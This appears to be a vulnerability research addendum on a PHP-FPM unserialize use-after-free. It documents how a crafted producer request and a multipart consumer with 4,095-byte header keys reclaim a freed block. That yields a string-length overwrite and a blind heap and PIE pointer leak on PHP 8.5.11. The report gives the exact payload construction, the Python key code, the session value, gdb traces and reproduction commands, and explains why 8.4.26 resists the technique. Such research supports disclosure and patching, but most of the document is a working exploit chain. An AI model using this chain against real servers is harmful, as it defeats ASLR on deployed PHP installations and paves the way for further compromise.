# Addendum — Same-worker controlled reclaim and blind pointer disclosure from the FPM pre-RINIT serializer-state UAF

**Date:** 2026-10-23
**Parent report:** `/tmp/opencode/research/fpm_bg_20261023T021053Z/report.md`
**Parent SHA-256:** `98d6fbddb8543be6ea1939c1b40e23d3fe22e6634af3fe2f539d1f98e65c7163` (unchanged)
**Lab root:** `/tmp/opencode/research/reclaim_fpm_20261023T091247Z/`
**Scope:** same-worker only. Dedicated static-1 FPM pools; stock nginx 1.30.1; stock PHP-FPM 8.4.26 and 8.5.11 binaries; ASLR on; `display_errors=Off`; no application LFI; no third-party write; no shared-service restart; no push/commit.

**Question:** can the proven same-worker pre-RINIT `BG(unserialize)` stale-state UAF be upgraded to a controlled reclaim with valid-ish Zend structures and an in-band, blind disclosure of the freed block or a heap/libphp pointer?

**Short answer:**

1. **8.5.11: yes for a controlled relative write and a blind heap + PIE leak.** A fresh static-1 worker, an E_USER_ERROR producer, then an 18-key multipart consumer with a 24,000-byte `pad` reclaims the stale `var_dtor_entries` block (B0) with a 4,095-byte header-name buffer. Setting `used_slots = -0x2deb` makes `var_tmp_var()` return `B0 - 0x2dea0`, which is exactly the length field of the second `LEAKMARK` zend_string used by `$_POST['leak']`. The session value `i:200;` overwrites that length. The script then returns `LEN=200` and 400 hex characters of adjacent heap/PIE data. **6/6 fresh-worker runs succeeded**, including **3/3 no-gdb blind runs**; every consumer returned HTTP 200, every worker stayed the same PID and answered a follow-up probe with 200.
2. **The leak is real ASLR disclosure.** The disclosed window contains a heap pointer with stable low bits (always `...b268`) and two php-fpm PIE pointers. In the run with `/proc/<pid>/maps`, the PIE pointers resolve to php-fpm mappings, giving the exact PIE base:
   `base = leaked_0x...dff48 - 0x16dff48 = leaked_0x...e92f0 - 0x7e92f0`.
   The heap pointer lies in an anonymous `rw-p` mapping at `+0x7c268`.
3. **8.4.26: no controlled reclaim/leak in this lab.** B0 is always `P + 0x3000` (pre-groom 64/128 does not change it). With the 24,000 pad and 20 key headers, the 4,096-byte key chain skips the coalesced P+B0 region; B0 is left `0x50`-filled and `used_slots=0x5050505050505050 > 255`, so `tmp_var()` allocates a fresh dtor block. A `LEAKMARK` field remains length 24; no pointer is disclosed. A layout where a key reaches P first instead splits P and destroys `last`/`last_dtor`, also without control. Exact blocker in §5.
4. **No controlled destructor, uid change, or RCE was achieved.** The stale `php_unserialize_data` is not `var_destroy`ed because the nested reuse leaves `BG(unserialize).level == 2`; `var_destroy` is skipped, so B0's `next`/dtor entries are never followed. The achieved marker is the controlled zend-string length overwrite and pointer leak. Exact blockers for a valid fake `php_unserialize_data` with `allowed_classes`/`ref_props` are in §6.
5. `report.md` was not modified. No cross-worker claim is made or implied.

---

## 1. Primitive geometry and exact write target

The 8.5.11 build used here is the plain full-extension build already used in the parent report:

| Component | Value | SHA-256 |
|---|---|---|
| 8.5.11 php-fpm | `/tmp/opencode/research/plain_full_8x_20261023T011800Z/bin/8.5.11/php-fpm` | `fe6db8c4a95536a3c7eb4aeda3e10d681937cb251420ab7cb33731b7d610f0f2` |
| 8.4.26 php-fpm (symbol build) | `/tmp/opencode/research/fpm_bg_20261023T021053Z/build/sym8426/sapi/fpm/php-fpm` | `e0b30a0aa8577e72e09d4f769ff684ef80cf1155ce2a25bea7c2927bcfd21023` |
| nginx | `nginx/1.30.1`, `/opt/nginx-1.30.1/sbin/nginx` | (parent report) |

`php_unserialize_data` offsets (source-verified, 64-bit):

```
last           +0
first_dtor     +8
last_dtor     +16
allowed_classes +24
ref_props     +32
cur_depth     +40
max_depth     +48
entries       +56
```

`var_dtor_entries`:

```
used_slots  +0   (zend_long)
next        +8   (pointer)
data[0]    +16   (zval[255], 16 bytes each)
```

`tmp_var()` uses `H = (*var_hashx)->last_dtor`, and when `H->used_slots + 1 <= 255` returns:

```
target = H + 16 + 16 * H->used_slots
```

with `H->used_slots` incremented and a `ZVAL_UNDEF` written at `target` before the parser writes the value. A negative `used_slots` therefore gives a backward, 16-byte-aligned relative write.

### 1.1 Producer leaves the stale chain

Producer request (same as parent report):

```
POST /unser_ref.php
Content-Type: application/x-www-form-urlencoded

mode=user_error&p=a:3:{i:0;s:3:"aaa";i:0;s:3:"bbb";i:1;R:99;}
```

The duplicate key creates B0, and the invalid `R:99` bails out after the E_USER_ERROR path while the worker survives. The worker is left with `BG(unserialize).level=1`, `BG(unserialize).data=P`, and a valid-looking stale P whose `last_dtor=B0`.

Fresh static-1 layout observed on 8.5.11:

```
P  = 0x7f....94000
B0 = 0x7f....89000     (B0 is 0x2deb0 below P; P and B0 are not adjacent)
```

Fresh static-1 layout observed on 8.4.26:

```
P  = 0x7f....80000
B0 = 0x7f....83000     (B0 = P + 0x3000; adjacent/coalesced region)
```

### 1.2 Reclaiming B0 with a header-name buffer

The multipart parser calls `_estrdup` for each part-header line. A header name of length 4,095 with a following `: x\r\n` allocates a 4,096-byte buffer, copied verbatim. The first eight bytes of that buffer are the fake `used_slots`; the next eight bytes are the fake `next`. The key must not contain `0x00`, CR, LF, or `:` because it is a C-string header name.

With the 24,000-byte `pad` and **18** 4,095-byte keys, the 18th 4,096-byte buffer is placed at B0:

```
key at B0:  struct.pack('<q', -0x2deb) + b'K0017' + b'A' * ...
used_slots = -11755 = -0x2deb
next       = 0x414141373130304b  ("K0017AAA")
```

`P` remains intact. The 24,000-byte pad produces two 24,032-byte allocations at `0x...6c000` and `0x...77000`; the key chain fills the lower 4,096-byte holes and reaches B0 without touching P.

### 1.3 The exact target

The consumer has two `LEAKMARK`-valued strings after multipart parsing:

```
S1 header = 0x7f....b118    (one copy)
S2 header = 0x7f....b150    (the string used by $_POST['leak'])
S2 - B0   = -0x2deb0
```

`u = (S2 - B0) / 16 = -0x2deb`. Therefore:

```
target = B0 + 16 + 16 * (-0x2deb)
       = B0 - 0x2dea0
       = S2 + 16
       = the zend_string length field of $_POST['leak']
```

The serialized session value `k|i:200;` writes a `zend_long 200` at `S2+16`, overwriting the string length. The next `tmp_var()` calls are at `S2+32` and `S2+48`, so they overwrite string data (and adjacent bytes) but not the length again. Because `BG(unserialize).level` is 2 during this nested decode, `php_var_unserialize_destroy()` does **not** call `var_destroy()`; B0/P are leaked rather than destroyed, and the request completes.

---

## 2. Reclaim / leak matrix

| Version | Pool | Reclaim shape | P/B0 relation | B0 reclaimed? | Control achieved | HTTP | Evidence |
|---|---|---|---|---|---|---|---|
| 8.5.11 | static-1 | 18 × 4,095-byte header keys + 24,000 `pad` + 24-byte `leak` | B0 = P - 0x2deb0 | **yes**, key buffer at B0 | `used=-0x2deb`; target `S2+16`; `LEN=200`; heap/PIE leak | **200** | `run1-3.json`, `gdb_run4/5.log`, `run6_maps.json` |
| 8.5.11 | static-1 | 17 keys + 128-element packed array (4,096 arData) | B0 below P | no; 4,096 arData at `0x...59000`/`0x...61000` | B0 stale `used=1`; array unchanged | 200 | `8511_bucket_arr.txt/.log` |
| 8.5.11 | static-1 | 17 keys + 4,072-byte `big` value (4,096 zend_string allocation) | B0 below P | no; B0 observed `0x42`-filled | `used=0x4242... > 255`; fresh dtor block; `LEN=24` unchanged | 200 | `8511_zstr_big.txt/.log` |
| 8.5.11 / 8.4.26 | static-1 | HashTable header (56 B) / zend_object | n/a | no; not a 4,096-byte allocation | different bin; HashTable-shaped 4,096 arData tested in the Bucket row | n/a | §6.4 |
| 8.4.26 | static-1 | 20 × 4,095-byte header keys + 24,000 `pad` + 24-byte `leak` | B0 = P + 0x3000 | **no**; key chain jumps `0x...6c000 -> 0x...88000` | B0 `0x50`-filled; `used=0x5050...`; fresh dtor block; `LEN=24` unchanged | 200 | `8426_block.log`, `8426_leak_attempt.txt` |
| 8.4.26 | static-1 | pre-groom 64 / 128 keys before producer | B0 = P + 0x3000 | no | geometry unchanged | 200 | `8426_geometry.txt` |
| 8.4.26 | static-1 | object-store bucket array (8 KiB) / key reaching P | B0 above P | no | P split if a key reaches P; `last_dtor=0x4141...`; no control | 502 / no leak | parent evidence; §5 |
| 8.4.26 | static-1 | pre-groom 64 / 128 + key spray | B0 above P | no | no controlled reclaim; no leak | 200/502 | parent evidence; §5 |

The only successful control shape is the raw 4,096-byte header-name buffer. It is not a complete Zend object; it is used as the `var_dtor_entries` prefix (`used_slots`, `next`) that the parser consults. See §6 for the valid-structure attempts and their exact blockers.

---

## 3. Blind in-band leak: exact request

### 3.1 Lab endpoints and settings

| Item | Value |
|---|---|
| nginx | `127.0.0.1:29650` → FPM `127.0.0.1:29651` |
| FPM pool | `pm=static`, `max_children=1`; one worker |
| 8.5.11 INI | `display_errors=Off`, `log_errors=On`, `session.serialize_handler=php`, `session.save_path=$LAB/lab/sessions8511`, `request_order=G`, `session.use_strict_mode=0`, `post_max_size=8M` |
| Producer endpoint | `/unser_ref.php` |
| Leak endpoint | `/128/leak.php` |

`leak.php`:

```php
<?php
session_start();
$s = $_POST['leak'] ?? '';
$r = $_REQUEST['leak'] ?? '';
echo "N=", count($_POST), "\n";
echo "KEYS=", implode(",", array_keys($_POST)), "\n";
echo "LEN=", strlen($s), "\n";
echo "RLEN=", strlen($r), "\n";
echo "HEX=", bin2hex(substr($s, 0, 400)), "\n";
echo "RHEX=", bin2hex(substr($r, 0, 400)), "\n";
```

`substr(..., 0, 400)` bounds the output to 400 bytes (800 hex characters) so the response stays small even when the corrupted length is 200.

### 3.2 Consumer body

The request is multipart/form-data. In order:

1. part `pad` = 24,000 bytes of `'P'`;
2. part `leak` = `b'LEAKMARK' + b'B' * 16` (length 24);
3. part `PHP_SESSION_UPLOAD_PROGRESS` = `prog`;
4. **18** header-name parts, each exactly:

```
--<boundary>\r\n
<4095-byte key>: x\r\n
```

where:

```python
key = struct.pack('<q', -0x2deb) + b'K%04d' % i + b'A' * (4095 - 8 - len(b'K%04d' % i))
assert len(key) == 4095
assert not any(c in key for c in b'\x00\r\n:')
```

5. file part `f`, filename `f.bin`, 16 bytes `X`;
6. closing boundary.

Session file `sess_wleak` contains exactly:

```
k|i:200;
```

Cookie: `PHPSESSID=wleak`. The request path is `/128/leak.php`.

### 3.3 Expected response

```
N=3
KEYS=pad,leak,PHP_SESSION_UPLOAD_PROGRESS
LEN=200
RLEN=0
HEX=<400 hex chars>
RHEX=
```

`LEN=200` is the overwritten length. `HEX` is the first 200 bytes of the string data, starting at `S2+24`; because the corruption also writes zvals at `S2+32` and `S2+48`, the window contains both parser-written values and adjacent live heap/PIE pointers.

### 3.4 No gdb and no absolute addresses in the exploit request

The blind reproduction driver (`/tmp/opencode/blind_leak8511.py`) restarts FPM fresh, sends the producer, sends the consumer above, records the HTTP response, checks the worker PID before/after, and sends a normal probe request. **gdb is not attached** for the three blind runs. The only absolute address used by the exploit is the negative relative `used_slots = -0x2deb`; no leaked address is fed back.

---

## 4. Leak results and raw evidence

### 4.1 Six successful runs

All runs used a freshly restarted static-1 worker. Runs 1–3 are blind/no-gdb; runs 4–5 add gdb for exact offsets; run 6 additionally captures `/proc/<pid>/maps`.

| Run | Mode | HTTP | Worker before/after | `LEN` | Heap pointer (data+24) | PIE pointer 1 (data+160) | PIE pointer 2 (data+192) | Derived PIE base |
|---|---|---|---|---|---|---|---|---|
| 1 | blind | 200 | `1718278` / `1718278` | 200 | `0x7f66e4c5b268` | `0x5570774dff48` | `0x5570765e92f0` | `0x557075e00000` |
| 2 | blind | 200 | `1719558` / `1719558` | 200 | `0x7f58b685b268` | `0x560786edff48` | `0x560785fe92f0` | `0x560785800000` |
| 3 | blind | 200 | `1721240` / `1721240` | 200 | `0x7f172925b268` | `0x55bc8ccdff48` | `0x55bc8bde92f0` | `0x55bc8b600000` |
| 4 | gdb | 200 | `1730866` (same PID; alive) | 200 | `0x7f0a0aa5b268` | `0x55de8eedff48` | `0x55de8dfe92f0` | `0x55de8d800000` |
| 5 | gdb | 200 | `1731106` (same PID; alive) | 200 | `0x7f4a44c5b268` | `0x55f1f00dff48` | `0x55f1ef1e92f0` | `0x55f1eea00000` |
| 6 | blind + maps | 200 | alive | 200 | `0x7f2c73c5b268` | `0x55d2bbedff48` | `0x55d2bafe92f0` | `0x55d2ba800000` |

Every run returned `N=3`, `KEYS=pad,leak,PHP_SESSION_UPLOAD_PROGRESS`, `LEN=200`, `RLEN=0`. Every follow-up probe returned 200.

The stable low bits are strong evidence the same objects are being disclosed each time:

- heap pointer: `...b268` (always; only the ASLR-dependent high part changes);
- PIE pointer 1: `...dff48`; PIE pointer 2: `...e92f0`;
- the two PIE pointers are mutually consistent with one base and the exact static offsets:
  `0x16dff48` and `0x7e92f0`.

### 4.2 Raw gdb trace (run 4)

```
EMALLOC size=4096 d=0x7f0a0aa94000 b0=0x7f0a0aa89000
EMALLOC ret=0x7f0a0aa88000 delta_b0=-4096
EMALLOC size=4096 d=0x7f0a0aa94000 b0=0x7f0a0aa89000
EMALLOC ret=0x7f0a0aa89000 delta_b0=0
TMP ah=0x7ffd186db5e0 p=0x7f0a0aa94000 last_dtor=0x7f0a0aa89000 \
    used=-11755 next=0x414141373130304b
TMP B dump: 0xffffffffffffd215 0x414141373130304b 0x4141414141414141 \
            0x4141414141414141 0x4141414141414141 0x4141414141414141 \
            0x4141414141414141 0x4141414141414141
TMP ret slot=0x7f0a0aa5b160 off=-188064 mem0=0x18 mem8=0x0
TMP B dump: 0xffffffffffffd216 ...
TMP ret slot=0x7f0a0aa5b170 off=-188048 mem0=0x4242424242424242 mem8=0x0
TMP B dump: 0xffffffffffffd217 ...
TMP ret slot=0x7f0a0aa5b180 off=-188032 mem0=0x6dc463fe0aa51000 mem8=0x0
...
SHUTDOWN level=0 data=0x0
```

Interpretation:

- `B0 = 0x7f0a0aa89000`; first qword is `0xffffffffffffd215 = -11755 = -0x2deb`; `next` is the key bytes `K0017AAA`.
- `P = 0x7f0a0aa94000`; P was preserved (not overwritten by the key chain).
- First target = `0x7f0a0aa5b160 = B0 - 0x2dea0 = S2 + 16`; `off=-188064` is exactly `-0x2dea0`.
- `mem0=0x18` at the target before the write is the original length 24. The parser then writes 200 there.
- The same trace prints `FIND LEAKMARK ... 0x7f0a0aa5b130 | 0x7f0a0aa5b168 | 2 patterns found`; these are the two data starts. Their headers are `S1=...b118` and `S2=...b150`; the target `...b160` is exactly `S2+16`.
- The next two writes at `S2+32` and `S2+48` explain the shape of the 200-byte window.
- `SHUTDOWN level=0 data=0x0` shows the stale state is cleared at request shutdown; `var_destroy` was skipped at level 2.

Runs 4 and 5 produced the same `used=-11755`, the same `off=-188064`, and the same `SHUTDOWN level=0 data=0x0`.

### 4.3 Parsed leak offsets

For every run 1–3 the 200-byte window has the same layout at 8-byte-aligned offsets:

| Data offset | Value / class | Note |
|---|---|---|
| +24 | heap pointer (`0x7f...b268`) | same low bits every run; within the worker's anonymous Zend heap mapping |
| +88 | `0x0000001600000001` | zend_refcounted header (refcount 1, type 0x16) |
| +144 | `0x0000000700000001` | zend_refcounted header (refcount 1, type 0x7) |
| +160 | php-fpm PIE pointer (`...dff48`) | static file offset `0x16dff48` from PIE base |
| +192 | php-fpm PIE pointer (`...e92f0`) | static file offset `0x7e92f0` from PIE base |
| ASCII | `PHP_SESSION_UPLOAD_PROGRESS` × 2 | upload-progress string data in the same window |

The window also contains `0xffffffff...` fields and small refcount/type values. The heap pointer is `S2 + 0x118`, i.e. **not** the freed P/B0 address; it points to a live adjacent heap object/string. This is a heap-pointer disclosure, not an exact freed-block address disclosure.

### 4.4 `/proc/<pid>/maps` correlation (run 6)

```
0x7f2c73c5b268 in 0x7f2c73bdf000-0x7f2c73e00000 rw-p off=0x0
    mapping base=0x7f2c73bdf000; pointer at +0x7c268

0x55d2bbedff48 in 0x55d2bb201000-0x55d2bbfca000 r--p off=0xa01000
    /tmp/.../bin/8.5.11/php-fpm
    mapping base=0x55d2ba800000; pointer at file offset 0x16dff48

0x55d2bafe92f0 in 0x55d2ba997000-0x55d2bb008000 r-xp off=0x197000
    /tmp/.../bin/8.5.11/php-fpm
    mapping base=0x55d2ba800000; pointer at file offset 0x7e92f0
```

Therefore the leak gives the **php-fpm PIE base exactly** (both pointers agree):

```
base = leaked_160 - 0x16dff48
     = leaked_192 - 0x7e92f0
```

For the six runs this yields the bases in the table above. The heap pointer gives the containing anonymous mapping base (`0x7f2c73bdf000` in run 6) and a stable offset `+0x7c268`; it does not directly reveal B0 or P.

---

## 5. 8.4.26 blocker (same-worker)

### 5.1 Fresh geometry

Pre-groom tests on a fresh static-1 8.4.26 worker:

```
=== 8.4.26 fresh pre-groom 64 ===
master 1766236 worker 1766237
groom 200
producer 500
pid 1766237 level 1 P 0x7f8ef1880000 B 0x7f8ef1883000 B-P 0x3000

=== 8.4.26 fresh pre-groom 128 ===
master 1766677 worker 1766678
groom 200
producer 500
pid 1766678 level 1 P 0x7fd998c80000 B 0x7fd998c83000 B-P 0x3000
```

The B0-above-P geometry is stable; pre-grooming 64 or 128 4,096-byte key buffers does not move B0.

### 5.2 20-key + pad attempt

Fresh worker, `P=0x7f4442480000`, `B0=0x7f4442483000`. The 20-key header chain with the 24,000 pad allocated:

```
0x...67000 0x...68000 0x...69000 0x...6a000 0x...6b000 0x...6c000
0x...88000 0x...89000 0x...8a000 0x...8b000 0x...8c000 0x...8d000
0x...8e000 0x...8f000 0x...91000 0x...92000 0x...93000 0x...94000
0x...95000 0x...96000
```

No key landed at `P=0x...80000` or `B0=0x...83000`. B0 was observed filled with `0x50` (`'P'`):

```
TMP ah=... p=0x7f4442480000 last_dtor=0x7f4442483000 \
    used=5787213827046133840 (0x5050505050505050) next=0x5050505050505050
TMP B dump: 0x5050505050505050 ...
```

Because `used_slots > 255`, `tmp_var()` allocated a fresh `var_dtor_entries` block at `0x...98000`; the leak field remained length 24:

```
consumer 200
N=3
KEYS=pad,leak,PHP_SESSION_UPLOAD_PROGRESS
LEN=24
RLEN=24
HEX=4c45414b4d41524b42424242424242424242424242424242
RHEX=4c45414b4d41524b42424242424242424242424242424242
```

No pointer disclosure; no B0 control.

### 5.3 Why it is blocked

Two layouts were observed and both block control:

1. **Coalesced/skip layout** (the run above): P and B0 are adjacent and can coalesce into a larger free block; the 4,096-byte bin skips that region and serves keys above B0 (`0x...88000+`). B0 is not reclaimed; it is filled by unrelated pad data and `used_slots` becomes non-controllable (`0x50...`).
2. **Split-P layout** (earlier evidence): if a key does reach P first, it overwrites `P+0`/`P+16` and destroys `last`/`last_dtor`; the next `tmp_var()` reads `last_dtor=0x4141...` and crashes. This is a 502, not a controlled write.

No tested allocation preserves `P+16` while taking B0. The object-store bucket array (8 KiB) lands below P and does not take P; no 8 KiB/valid-structure allocation was found that reclaims P with the needed `last_dtor` preservation. 8.4.26 is therefore **not** upgraded to a leak in this lab.

---

## 6. Valid Zend structures and fake `php_unserialize_data`

### 6.1 `zend_string` payload at/near B0

Request: 17 keys + a `big` value of 4,072 bytes (so the zend_string allocation is 4,096 bytes) + a 24-byte `leak` field. The observed B0 was `0x42`-filled from the big value; `used_slots=0x4242424242424242 > 255`:

```
TMP ... last_dtor=0x...89000 used=4774451407313060418 next=0x4242424242424242
TMP B dump: 0x4242424242424242 ...
TMP ret slot=0x...88010 off=-4080 ...
```

`tmp_var()` allocated a fresh dtor block; the response remained `LEN=24` with the original `LEAKMARK` hex. A valid 4,096-byte zend_string does not provide controllable `used_slots`/`next` at B0 because the first 8 bytes are the string's refcount/type header (or, when the visible bytes are data, a non-control fill), not the fake dtor prefix.

### 6.2 Packed-array Bucket `arData` at B0

Request: 17 keys + 128 `arr[]` integer fields (4,096-byte packed arData). The 4,096-byte allocation log showed returns at `0x...59000` (before the pad) and `0x...61000` (after), not B0. B0 remained stale with `used=1`; `tmp_var()` wrote at `B0+0x20`, not into an attacker-chosen address. The response array was unchanged:

```
N=128
A0='1'
A1='2'
A2='3'
```

A real Bucket `arData` is a valid Zend structure, but this layout did not place it at B0; even if it had, the first bucket's zval (`value`/`type`) is not an arbitrary `used_slots`/`next` pair.

### 6.3 Fake `php_unserialize_data` with `allowed_classes`/`ref_props`

A fake P would need, at minimum, valid-looking `last`, `first_dtor`, `last_dtor`, `allowed_classes`, and `ref_props` pointers, plus a dtor chain. That was **not** achieved. The exact blockers are:

1. **Direction.** On 8.5.11, P is above B0 (`P = B0 + 0x2deb0`). The relative-write key encodes a negative `used_slots`; it can only target addresses below B0. A positive `used_slots` would be required to reach P, but the 8-byte positive value contains high NUL bytes, which terminate the C-string header name before `_estrdup` can copy 4,096 bytes. Positive relative writes are therefore not encodable with this reclaim shape.
2. **C-string alphabet.** Header keys cannot contain `0x00`, CR, LF, or `:`. Absolute Zend pointers (`0x00007f...`, `0x000055...`) contain NUL bytes in their high bytes, so a valid fake P with absolute pointers cannot be written through the key-header channel. A binary write channel (not present in the tested request) would be required.
3. **Reclaim shape.** The only controllable bytes at B0 are a raw `_estrdup` buffer. A real `zend_string`'s first 8 bytes are its `gc` (refcount/type; typically `0x0000000600000001`, far above 255) and a Bucket's first 8 bytes are a zval value, not a controllable dtor prefix. Both force `tmp_var()` to allocate a fresh dtor block instead of using B0.
4. **8.4.26 geometry.** P is below/coalesced with B0; reaching B0 either skips the region or splits P first, as in §5.
5. **No `var_destroy` path.** During the nested session decode, `BG(unserialize).level` is 2, so `php_var_unserialize_destroy()` does not call `var_destroy()`; B0's `next` and dtor zvals are not followed. There is no destructor callback to hijack in this state. Forcing level 1 would make the parser follow the key-bytes `next` pointer and crash, not yield control.

**No controlled destructor, marker beyond the length overwrite, or uid change was reproduced.** The controlled marker is the `LEN=200` overwrite plus pointer disclosure, reproduced 6/6 (3 blind + 2 gdb + 1 maps run).

### 6.4 `HashTable` header and object allocations

A `HashTable` header is 56 bytes, not 4,096; it is served by a smaller allocator bin and cannot be returned for the 4,096-byte B0 chunk. The 4,096-byte HashTable-like allocation is its `arData` bucket array, tested in §6.2 (landed at `0x...59000`/`0x...61000`, not B0). A `zend_object` size is class-dependent; no 4,096-byte object was available that reached B0. The 8 KiB object-store bucket array landed at `0x...53000`, below P, and is not B0/P. Thus no full HashTable/object shape was placed at B0; the Bucket result is the relevant blocker.

---

## 7. Reproduction commands

### 7.1 8.5.11 leak

Start fresh FPM (or let the driver restart it):

```bash
LAB=$(cat /tmp/opencode/reclaim_fpm_lab_path)
FPM=/tmp/opencode/research/plain_full_8x_20261023T011800Z/bin/8.5.11/php-fpm
LD_LIBRARY_PATH=/tmp/opencode/realapps/icu-out/lib:/tmp/opencode/realapps/onig-out/lib \
  "$FPM" -F -y "$LAB/lab/conf8511/fpm-reclaim8511.conf" \
  -c "$LAB/lab/conf8511/php-reclaim8511.ini"
```

Blind three-run reproduction (no gdb):

```bash
python3 /tmp/opencode/blind_leak8511.py 3
```

Single gdb/calibration run:

```bash
python3 /tmp/opencode/reclaim_probe8511.py leaklen -0x2deb 18 24000 24
```

Valid-structure diagnostics:

```bash
python3 /tmp/opencode/arr_valid8511.py 17      # 128-element Bucket arData
python3 /tmp/opencode/zstr8511.py 17            # 4,072-byte zend_string payload
```

### 7.2 8.4.26 blocker

```bash
python3 /tmp/opencode/block8426.py 20
python3 /tmp/opencode/groom_test.py 64
python3 /tmp/opencode/groom_test.py 128
```

### 7.3 Notes

- Each measured run restarts FPM for a fresh worker; the 8.5.11 layout (`P=...94000`, `B0=...89000`, `S2=...b150`) was stable across restarts.
- gdb is calibration/evidence only; the blind driver does not attach gdb and does not use absolute addresses.
- The 8.5.11 INI has `request_order=G`, so `$_REQUEST` has no POST copy (`RLEN=0`). `$_POST['leak']` is the second `LEAKMARK` string (S2). With a different `request_order`, the duplicate string layout can shift and the `u` value must be recalibrated; this is layout sensitivity, not a binary primitive change.
- `display_errors=Off` and the stock nginx/FPM binaries are used throughout. `pad`, `leak`, and the 4,095-byte keys are ordinary multipart fields/headers; no app LFI, no file read, no third-party write.

---

## 8. Evidence files and SHA-256

All paths under `$LAB` unless absolute; `$LAB = /tmp/opencode/research/reclaim_fpm_20261023T091247Z`.

| File | Role | SHA-256 |
|---|---|---|
| `leak_runs/run1.json` | blind run 1 full request/response, same PID | `b64f67687de0b5e623b5d1557252736b402d3d2db3589d90c9ca3896a993ed6b` |
| `leak_runs/run2.json` | blind run 2 | `c36d1908da099f4c6bcc17983883796825f934a0f71a20c1833f65fa6f56657b` |
| `leak_runs/run3.json` | blind run 3 | `04d6e63debeea92f6f1805c3d823c953c9769bae600aa9b4816d2b2b8fab0388` |
| `leak_runs/gdb_run4.log` | exact `used=-11755`, target offset, B dump | `30b197df5ef513017d3b6437108c0ba9a2f4c778e2dd7bb942d05b4e0b903afe` |
| `leak_runs/gdb_run5.log` | repeat | `e312b62ac29c08d6987500d1e088877c8fadf7bb6e45a91eb7ab07a6dc80023e` |
| `/tmp/opencode/leaklen_run4.out` | run 4 stdout/response | `082a167496ea0164937e97396ad441448ae17a455dec26cfdfefdf9607303999` |
| `/tmp/opencode/leaklen_run5.out` | run 5 stdout/response | `836e489d26f3384fa3bdd8961384c79b16bb426e1c91bb789cbc39f1af8dd502` |
| `leak_runs/run6_maps.json` | leak + `/proc/<pid>/maps` correlation | `f9ddbab2f33f62d93221d5b16312f506e67825223378de0478b2c846b3ba4af0` |
| `leak_runs/8426_block.log` | 8.4.26 key/TMP trace | `02b338927e333605204ef576d743cb05a0aee8ca4b4ab4cf19b639887fba33c8` |
| `leak_runs/8426_leak_attempt.txt` | 8.4.26 HTTP 200, `LEN=24` unchanged | `4e37909b82410ff344dde7b5b3d8cb816f7c59545b3775699a584e2eca93b8e0` |
| `leak_runs/8426_geometry.txt` | pre-groom 64/128 geometry | `cf0c360e6a255b207a7dddabe2ebfa9aa3a59006f3c30af7922489e17f67a3c3` |
| `leak_runs/8511_zstr_big.txt` | zend_string test response | `dcfef41811f28095ce1ba7e236737e1f9d79e5422358427d2be958fe1f750ff2` |
| `leak_runs/8511_zstr_big.log` | zend_string test gdb trace | `2a086095a8958ccdc72df1ba15a1333f8e5620a985c74de606021f733d98f84f` |
| `leak_runs/8511_bucket_arr.txt` | Bucket arData test response | `9a528c75ded1d26d2750788b5bb972e03df27cb4f0dba5375668ef368ded6a84` |
| `leak_runs/8511_bucket_arr.log` | Bucket arData test gdb trace | `7b564bebbfbe45a1937d574dd2ffbc1d736dff3dd855b1d7ff11a11ee2d10289` |
| `lab/conf8511/php-reclaim8511.ini` | 8.5.11 INI | `c8d037521695d6c7975012f8f9d2c91cb048876bd7b7317f874cad2505555241` |
| `lab/conf8511/fpm-reclaim8511.conf` | 8.5.11 pool | `d92cbc2d4883ba3f2be5fa9d4752cc09153be278d47afcfae3fd809f0dba961b` |
| `lab/conf/php-reclaim.ini` | 8.4.26 INI | `20e9f40c9eeb08d04489db48c1592ae36173c2971ee7e10b9a39a8d70a274acd` |
| `lab/conf/fpm-reclaim.conf` | 8.4.26 pool | `171f996fdefc153be23922ec52c1cb127014859bdce2ddc190bf10f57a92a3e6` |
| `/tmp/opencode/research/plain_full_8x_20261023T011800Z/bin/8.5.11/php-fpm` | 8.5.11 binary | `fe6db8c4a95536a3c7eb4aeda3e10d681937cb251420ab7cb33731b7d610f0f2` |
| `/tmp/opencode/research/fpm_bg_20261023T021053Z/build/sym8426/sapi/fpm/php-fpm` | 8.4.26 symbol binary | `e0b30a0aa8577e72e09d4f769ff684ef80cf1155ce2a25bea7c2927bcfd21023` |
| `report.md` | parent report, unchanged | `98d6fbddb8543be6ea1939c1b40e23d3fe22e6634af3fe2f539d1f98e65c7163` |

Raw response bodies are stored in the JSON files; the gdb logs contain the full `TMP`/`EMALLOC`/`SHUTDOWN` lines (and `ESTRDUP` lines in the 8.4.26 trace). The evidence hashes above were computed after the final runs; `report.md`'s hash is identical to the parent report hash recorded before this addendum.

---

## 9. Limitations / non-claims

- **Same-worker only.** Both labs are `pm=static`, `max_children=1`; producer and consumer are guaranteed to run on the same worker. The blind JSON files record `worker_before == worker_after` and a 200 probe. No cross-worker conclusion is made.
- **Layout sensitivity.** The 8.5.11 leak works on the fresh-worker layout used here (`P=...94000`, `B0=...89000`, `S2=...b150`). The relay is calibrated with 18 keys, 24,000-byte pad, and `u=-0x2deb`. A different worker history, pool, or request order can shift the second string and require recalibration. The 6/6 fresh-worker reproduction is evidence of reliability in this layout, not a claim of universal layout independence.
- **Leak content.** The disclosure is a heap pointer plus php-fpm PIE pointers; the exact freed P/B0 address is not present in the 200-byte window. If an exact freed-block address is the requirement, this leak does not satisfy it. The PIE base is exact; the heap pointer gives its containing anonymous mapping and stable offset.
- **No RCE, no controlled destructor, no uid change.** The stale P is not `var_destroy`ed (level 2); the `next` pointer is never followed. The controlled marker is the zend-string length overwrite and the pointer disclosure.
- **No stock 8.5.12 test here.** 8.5.12 is fixed in the parent report; this addendum is only about 8.4.26/8.5.11 reclaim/leak behavior.
- **No shared services, no push/commit.** Only dedicated lab FPM pools and nginx vhosts were used; `report.md` was not modified.
